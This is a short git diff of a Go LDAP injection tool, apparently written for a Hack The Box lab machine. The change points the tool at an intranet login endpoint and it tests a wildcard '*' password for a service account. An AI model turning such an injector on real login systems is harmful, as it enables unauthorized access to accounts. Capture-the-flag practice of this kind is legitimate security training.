@@ -47,7 +47,7 @@ func (li *LdapInjector) TestPassword(password string) (bool, error) {
 }
 
 func main () {
-	c := NewLdapInjector("http://intranet.ghost.htb", "gitea_temp_principal")
+	c := NewLdapInjector("http://intranet.ghost.htb:8008/login", "gitea_temp_principal")
 	resp, err := c.TestPassword("*")
 	if err != nil {
 		fmt.Println("Error:", err)
